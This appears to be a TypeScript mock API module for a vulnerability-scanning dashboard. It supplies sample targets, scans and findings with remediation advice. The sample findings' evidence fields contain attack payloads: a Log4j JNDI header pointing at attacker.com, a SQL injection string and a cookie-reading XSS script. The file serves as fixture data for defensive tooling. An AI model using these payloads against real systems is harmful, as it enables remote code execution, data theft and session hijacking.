import axios from 'axios'
import {
  Scan,
  ScanListItem,
  CreateScanRequest,
  Target,
  TargetListItem,
  CreateTargetRequest,
  Finding,
  FindingListItem,
  Severity,
  FindingStatus,
  User,
} from '../types'

// Mock API delay helper
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms))

// In-memory mock DB
let mockTargets: Target[] = [
  {
    id: 'target_1',
    name: 'Production Web App',
    criticality: 'critical',
    urls: ['https://app.secureai.example.com'],
    ip_ranges: ['192.168.1.0/24'],
    owner: 'security@example.com',
    last_scan: '2024-01-15T09:45:00Z',
    created_at: '2023-11-01T00:00:00Z',
    description: 'Main customer-facing web application and portal',
    open_findings: 12,
    total_scans: 24,
  },
  {
    id: 'target_2',
    name: 'API Gateway',
    criticality: 'high',
    urls: ['https://api.secureai.example.com'],
    ip_ranges: ['192.168.2.0/24'],
    owner: 'devops@example.com',
    last_scan: '2024-01-14T14:20:00Z',
    created_at: '2023-11-15T00:00:00Z',
    description: 'Core microservices gateway and auth endpoints',
    open_findings: 5,
    total_scans: 40,
  },
  {
    id: 'target_3',
    name: 'Internal Dashboard',
    criticality: 'medium',
    urls: ['https://internal.secureai.example.com'],
    ip_ranges: ['10.0.0.0/16'],
    owner: 'admin@example.com',
    last_scan: '2024-01-10T11:00:00Z',
    created_at: '2023-12-01T00:00:00Z',
    description: 'Internal operations dashboard',
    open_findings: 2,
    total_scans: 15,
  },
]

let mockScans: Scan[] = [
  {
    id: 'scan_1',
    target_id: 'target_1',
    target_name: 'Production Web App',
    status: 'completed',
    profile: 'standard',
    tools: ['zap', 'nikto', 'sslyze'],
    total_findings: 12,
    critical_findings: 2,
    high_findings: 5,
    medium_findings: 3,
    low_findings: 1,
    info_findings: 1,
    started_at: '2024-01-15T09:00:00Z',
    completed_at: '2024-01-15T09:45:00Z',
    duration: '45m',
    progress: 100,
    estimated_duration: '45m',
    tool_status: {
      zap: { status: 'completed', progress: 100, findings: 7 },
      nikto: { status: 'completed', progress: 100, findings: 3 },
      nmap: { status: 'completed', progress: 100, findings: 1 },
      sslyze: { status: 'completed', progress: 100, findings: 1 },
    },
  },
  {
    id: 'scan_2',
    target_id: 'target_2',
    target_name: 'API Gateway',
    status: 'running',
    profile: 'comprehensive',
    tools: ['zap', 'nmap', 'nikto', 'sslyze'],
    total_findings: 4,
    critical_findings: 1,
    high_findings: 2,
    medium_findings: 1,
    low_findings: 0,
    info_findings: 0,
    started_at: '2024-01-15T10:30:00Z',
    completed_at: null,
    duration: null,
    progress: 65,
    estimated_duration: '1h 30m',
    tool_status: {
      zap: { status: 'running', progress: 70, findings: 3 },
      nikto: { status: 'completed', progress: 100, findings: 1 },
      nmap: { status: 'completed', progress: 100, findings: 0 },
      sslyze: { status: 'queued', progress: 0, findings: 0 },
    },
  },
  {
    id: 'scan_3',
    target_id: 'target_3',
    target_name: 'Internal Dashboard',
    status: 'failed',
    profile: 'quick',
    tools: ['zap'],
    total_findings: 0,
    critical_findings: 0,
    high_findings: 0,
    medium_findings: 0,
    low_findings: 0,
    info_findings: 0,
    started_at: '2024-01-12T08:15:00Z',
    completed_at: '2024-01-12T08:18:00Z',
    duration: '3m',
    progress: 15,
    estimated_duration: '5m',
    tool_status: {
      zap: { status: 'failed', progress: 15, findings: 0 },
      nikto: { status: 'queued', progress: 0, findings: 0 },
      nmap: { status: 'queued', progress: 0, findings: 0 },
      sslyze: { status: 'queued', progress: 0, findings: 0 },
    },
  },
]

let mockFindings: Finding[] = [
  {
    id: 'find_1',
    scan_id: 'scan_1',
    target_id: 'target_1',
    severity: 'critical',
    status: 'open',
    title: 'Remote Code Execution via Log4j Vulnerability',
    description: 'An attacker can exploit unvalidated JNDI lookups in logging mechanisms to execute arbitrary Java code on the server.',
    endpoint: '/api/v1/log',
    method: 'POST',
    parameter: 'X-Forwarded-For',
    evidence: 'POST /api/v1/log HTTP/1.1\nHost: app.secureai.example.com\nX-Forwarded-For: ${jndi:ldap://attacker.com/a}',
    cwe_id: 'CWE-502',
    cwe_title: 'Deserialization of Untrusted Data',
    risk_score: 9.8,
    discovered_at: '2024-01-15T09:20:00Z',
    tool_source: ['OWASP ZAP', 'Nikto'],
    ai_explanation: 'The application parses log headers without sanitizing user-supplied input. When JNDI lookup strings are evaluated by the underlying logging subsystem, it contacts external LDAP servers, allowing class loading and remote code execution.',
    ai_impact: 'Full system compromise, data theft, and potential lateral movement within the private cloud network.',
    ai_remediation: 'Upgrade Log4j library to version 2.17.1 or higher, or disable message lookups by setting log4j2.formatMsgNoLookups=true.',
    remediation_code: '// Disable message lookups in JVM arguments\nSystem.setProperty("log4j2.formatMsgNoLookups", "true");\n\n// Or update dependency in pom.xml\n<dependency>\n    <groupId>org.apache.logging.log4j</groupId>\n    <artifactId>log4j-core</artifactId>\n    <version>2.17.1</version>\n</dependency>',
    owner: 'security@example.com',
    notes: 'Initial triage complete. Scheduled for urgent patch.',
    timeline: [
      { id: 't_1', action: 'Discovered', actor: 'OWASP ZAP', timestamp: '2024-01-15T09:20:00Z', details: 'Identified via signature matching' },
      { id: 't_2', action: 'Status Changed', actor: 'security@example.com', timestamp: '2024-01-15T10:00:00Z', details: 'Marked as Open' },
    ],
  },
  {
    id: 'find_2',
    scan_id: 'scan_1',
    target_id: 'target_1',
    severity: 'critical',
    status: 'in_progress',
    title: 'SQL Injection in User Search Parameter',
    description: 'The query parameter `q` in the user search endpoint is directly concatenated into the SQL statement without proper escaping.',
    endpoint: '/api/v1/users/search',
    method: 'GET',
    parameter: 'q',
    evidence: 'GET /api/v1/users/search?q=admin\'+OR+\'1\'=\'1 HTTP/1.1\nHost: app.secureai.example.com',
    cwe_id: 'CWE-89',
    cwe_title: 'Improper Neutralization of Special Elements used in an SQL Command',
    risk_score: 9.1,
    discovered_at: '2024-01-15T09:25:00Z',
    tool_source: ['OWASP ZAP'],
    ai_explanation: 'Direct concatenation of user input into database queries allows attackers to manipulate query logic, bypass authentication, and extract sensitive database contents.',
    ai_impact: 'Unauthorised read/write access to user credentials, personal identifiable information (PII), and session tokens.',
    ai_remediation: 'Use parameterized queries (prepared statements) or ORM parameter binding for all database interactions.',
    remediation_code: '// Vulnerable\nconst query = "SELECT * FROM users WHERE name LIKE \'" + searchTerm + "\'";\n\n// Secure\nconst query = "SELECT * FROM users WHERE name LIKE ?";\nconst results = await db.query(query, [`%${searchTerm}%`]);',
    owner: 'dev@example.com',
    notes: 'Developer is working on ORM refactoring.',
    timeline: [
      { id: 't_3', action: 'Discovered', actor: 'OWASP ZAP', timestamp: '2024-01-15T09:25:00Z', details: 'SQLmap payload injection successful' },
    ],
  },
  {
    id: 'find_3',
    scan_id: 'scan_1',
    target_id: 'target_1',
    severity: 'high',
    status: 'open',
    title: 'Cross-Site Scripting (XSS) in Profile Bio',
    description: 'Reflected and stored XSS detected in user profile bio update form.',
    endpoint: '/api/v1/profile/bio',
    method: 'PUT',
    parameter: 'bio',
    evidence: 'PUT /api/v1/profile/bio HTTP/1.1\nHost: app.secureai.example.com\nContent-Type: application/json\n\n{"bio": "<script>alert(document.cookie)</script>"}',
    cwe_id: 'CWE-79',
    cwe_title: 'Improper Neutralization of Input During Web Page Generation',
    risk_score: 8.2,
    discovered_at: '2024-01-15T09:30:00Z',
    tool_source: ['Nikto', 'OWASP ZAP'],
    ai_explanation: 'User input rendered inside HTML without sanitization executes arbitrary JavaScript in the context of other users browsers.',
    ai_impact: 'Session hijacking, account takeover, and unauthorized actions performed on behalf of the victim.',
    ai_remediation: 'Encode all dynamic output rendered in HTML and implement a strict Content Security Policy (CSP).',
    remediation_code: '// Sanitize using DOMPurify\nimport DOMPurify from \'dompurify\';\nconst cleanBio = DOMPurify.sanitize(userBio);',
    owner: null,
    notes: null,
    timeline: [
      { id: 't_4', action: 'Discovered', actor: 'Nikto', timestamp: '2024-01-15T09:30:00Z', details: 'Script payload reflected in response' },
    ],
  },
]

export const api = {
  async getDashboardSummary() {
    await delay(300)
    return {
      stats: {
        total_scans: 142,
        total_scans_trend: '+12%',
        open_findings: 38,
        open_findings_trend: '-4%',
        critical_vulnerabilities: 5,
        critical_vulnerabilities_trend: '-2',
        targets_monitored: 12,
        targets_monitored_trend: '+1',
      },
      severity_distribution: [
        { name: 'Critical', count: 5, color: '#DC2626' },
        { name: 'High', count: 12, color: '#EA580C' },
        { name: 'Medium', count: 15, color: '#CA8A04' },
        { name: 'Low', count: 4, color: '#2563EB' },
        { name: 'Info', count: 2, color: '#6B7280' },
      ],
      vulnerability_trend: [
        { week: 'W1', critical: 8, high: 14, medium: 20 },
        { week: 'W2', critical: 7, high: 15, medium: 18 },
        { week: 'W3', critical: 9, high: 12, medium: 22 },
        { week: 'W4', critical: 6, high: 10, medium: 19 },
        { week: 'W5', critical: 5, high: 12, medium: 17 },
        { week: 'W6', critical: 4, high: 9, medium: 15 },
        { week: 'W7', critical: 7, high: 13, medium: 21 },
        { week: 'W8', critical: 5, high: 11, medium: 18 },
        { week: 'W9', critical: 6, high: 10, medium: 16 },
        { week: 'W10', critical: 4, high: 8, medium: 14 },
        { week: 'W11', critical: 5, high: 11, medium: 15 },
        { week: 'W12', critical: 5, high: 12, medium: 15 },
      ],
      recent_scans: mockScans,
      top_vulnerabilities: mockFindings.slice(0, 5),
    }
  },

  async getTargets(): Promise<Target[]> {
    await delay(250)
    return mockTargets
  },

  async getTarget(id: string): Promise<Target | undefined> {
    await delay(200)
    return mockTargets.find(t => t.id === id)
  },

  async createTarget(data: CreateTargetRequest): Promise<Target> {
    await delay(300)
    const newTarget: Target = {
      id: `target_${Date.now()}`,
      ...data,
      last_scan: null,
      created_at: new Date().toISOString(),
      open_findings: 0,
      total_scans: 0,
      description: data.description || null,
    }
    mockTargets.push(newTarget)
    return newTarget
  },

  async getScans(): Promise<Scan[]> {
    await delay(250)
    return mockScans
  },

  async getScan(id: string): Promise<Scan | undefined> {
    await delay(200)
    return mockScans.find(s => s.id === id)
  },

  async createScan(data: CreateScanRequest): Promise<Scan> {
    await delay(400)
    const target = mockTargets.find(t => t.id === data.target_id)
    const newScan: Scan = {
      id: `scan_${Date.now()}`,
      target_id: data.target_id,
      target_name: target ? target.name : 'Unknown Target',
      status: 'running',
      profile: data.profile,
      tools: data.tools,
      total_findings: 0,
      critical_findings: 0,
      high_findings: 0,
      medium_findings: 0,
      low_findings: 0,
      info_findings: 0,
      started_at: new Date().toISOString(),
      completed_at: null,
      duration: null,
      progress: 5,
      estimated_duration: data.profile === 'quick' ? '5m' : data.profile === 'standard' ? '15m' : '45m',
      tool_status: {
        zap: { status: data.tools.includes('zap') ? 'running' : 'queued', progress: 10, findings: 0 },
        nikto: { status: data.tools.includes('nikto') ? 'queued' : 'queued', progress: 0, findings: 0 },
        nmap: { status: data.tools.includes('nmap') ? 'queued' : 'queued', progress: 0, findings: 0 },
        sslyze: { status: data.tools.includes('sslyze') ? 'queued' : 'queued', progress: 0, findings: 0 },
      },
    }
    mockScans.unshift(newScan)
    return newScan
  },

  async stopScan(id: string): Promise<Scan> {
    await delay(200)
    const scan = mockScans.find(s => s.id === id)
    if (scan) {
      scan.status = 'stopped'
      scan.completed_at = new Date().toISOString()
    }
    return scan!
  },

  async getFindings(): Promise<Finding[]> {
    await delay(250)
    return mockFindings
  },

  async getFinding(id: string): Promise<Finding | undefined> {
    await delay(200)
    return mockFindings.find(f => f.id === id)
  },

  async updateFindingStatus(id: string, status: FindingStatus, notes?: string): Promise<Finding> {
    await delay(250)
    const finding = mockFindings.find(f => f.id === id)
    if (finding) {
      finding.status = status
      if (notes) finding.notes = notes
      finding.timeline.push({
        id: `t_${Date.now()}`,
        action: `Status changed to ${status}`,
        actor: 'Current User',
        timestamp: new Date().toISOString(),
        details: notes || null,
      })
    }
    return finding!
  },

  async getReports() {
    await delay(250)
    return [
      { id: 'rep_1', name: 'Q1 Executive Security Summary', format: 'PDF', generated_at: '2024-01-15T10:00:00Z', size: '2.4 MB', target: 'Production Web App' },
      { id: 'rep_2', name: 'API Gateway OWASP Top 10 Audit', format: 'PDF', generated_at: '2024-01-14T15:30:00Z', size: '4.1 MB', target: 'API Gateway' },
      { id: 'rep_3', name: 'Internal Compliance Assessment', format: 'HTML', generated_at: '2024-01-10T12:00:00Z', size: '1.8 MB', target: 'Internal Dashboard' },
    ]
  },

  async generateReport(data: { target_id: string; type: string; format: string }) {
    await delay(800)
    return {
      id: `rep_${Date.now()}`,
      name: `${data.type} Report`,
      format: data.format.toUpperCase(),
      generated_at: new Date().toISOString(),
      size: '3.2 MB',
      download_url: '#',
    }
  },

  async getTeam() {
    await delay(200)
    return [
      { id: 'u_1', name: 'Sarah Connor', email: 'sarah@example.com', role: 'admin', last_login: '2 hours ago' },
      { id: 'u_2', name: 'John Reese', email: 'john@example.com', role: 'analyst', last_login: '1 day ago' },
      { id: 'u_3', name: 'Miles Dyson', email: 'miles@example.com', role: 'developer', last_login: '3 days ago' },
    ]
  },
}
